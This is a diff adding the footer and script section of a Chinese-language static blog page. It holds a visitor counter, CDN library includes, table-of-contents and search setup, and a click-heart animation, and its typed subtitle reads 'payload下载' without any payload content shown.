+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "payload下载&nbsp;",
+      ],
+      cursorChar: "",
+      typeSpeed: 100,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+  
+  
+    <script>
+      !function (e, t, a) {
+        function r() {
+          for (var e = 0; e < s.length; e++) s[e].alpha <= 0 ? (t.body.removeChild(s[e].el), s.splice(e, 1)) : (s[e].y--, s[e].scale += .004, s[e].alpha -= .013, s[e].el.style.cssText = "left:" + s[e].x + "px;top:" + s[e].y + "px;opacity:" + s[e].alpha + ";transform:scale(" + s[e].scale + "," + s[e].scale + ") rotate(45deg);background:" + s[e].color + ";z-index:99999");
+          requestAnimationFrame(r)
+        }
+
+        function n() {
+          var t = "function" == typeof e.onclick && e.onclick;
+          e.onclick = function (e) {
+            t && t(), o(e)
+          }
+        }
+
+        function o(e) {
+          var a = t.createElement("div");
+          a.className = "heart", s.push({
+            el: a,
+            x: e.clientX - 5,
+            y: e.clientY - 5,
+            scale: 1,
+            alpha: 1,
+            color: c()
+          }), t.body.appendChild(a)
+        }
+
+        function i(e) {
+          var a = t.createElement("style");
+          a.type = "text/css";
+          try {
+            a.appendChild(t.createTextNode(e))
+          } catch (t) {
+            a.styleSheet.cssText = e
+          }
+          t.getElementsByTagName("head")[0].appendChild(a)
+        }
+
+        function c() {
+          return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
+        }
+
+        var s = [];
+        e.requestAnimationFrame = e.requestAnimationFrame || e.webkitRequestAnimationFrame || e.mozRequestAnimationFrame || e.oRequestAnimationFrame || e.msRequestAnimationFrame || function (e) {
+          setTimeout(e, 1e3 / 60)
+        }, i(".heart{width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;}.heart:after{top: -5px;}.heart:before{left: -5px;}"), n(), r()
+      }(window, document);
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
